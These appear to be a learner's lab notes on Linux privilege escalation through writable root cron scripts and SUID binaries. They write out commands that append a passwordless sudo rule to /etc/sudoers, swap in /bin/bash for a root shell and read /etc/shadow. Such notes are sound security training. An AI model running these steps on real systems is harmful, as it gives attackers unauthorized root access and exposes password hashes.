# 2 Misconfigured Cron Jobs
-> listing cron jobs
	-> `crontab -l`
1. Find a script associated with the `root` account , which looks sus
2. try to find that script path , if it might get used in any script
	-> `grep -rnw / -e '/FILE/PATH/TO/SEARCH/FOR'`
	-> `grep -rnw / -e '/home/kali/script`
3. If , it gets used in any script , that script will come , check the perms associated with that script , if you could change it , it might have a good vector for `cron job privesc`
4. change the file content accordingly , like modification in `sudoers` file.
	-> `printf '#!/bin/bash\n echo "kali ALL=NOPASSWD:ALL" '  >> /etc/sudoers > /PATH/TO/SCRIPT`


Modifying the script, since no text editor is present we will use;
```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```
`#!/bin/bash` specifying the environment variable
`\n`: create a new line and say echo = `\necho`
`"student ALL=NOPASSWD:ALL"`: the text we want to redirect is going to involve the student account.
	`student` should have `ALL` permissions without providing passwords `=NOPASSWD`:`ALL` again all permissions.
	`>>`: append it to the /etc/sudoers
	`>`: Save the output to th .sh script 
i.e., echoing/redirecting the following output into sudo's file, where the student account have all privileges and no need to specify password

# 3 Exploiting SUID Binaries
set owner user ID
`pre-requisites` :
	-> owner of the file must be a `root` user.
	-> files must have SUID bit set 
	-> Executable perms must be allocated.
```
whoami
groups <name>

ls -la
./welcome

file welcome
strings welcome

rm greetings
cp /bin/bash greetings
ls

rerun the script
./welcome
id
cat /etc/shadow
```

the `s` in `-rwsr-xr-x` specifies `SUID` permissions
`file` to determine the type of a file
`strings`: a utility used to ==find and print sequences of printable characters== (text) from a file, especially from binary or non-text files
`cp /bin/bash greetings`: Created a bash binary  file named as greeting
	So the `welcome` binary will now execute the and provide us a root bash session.
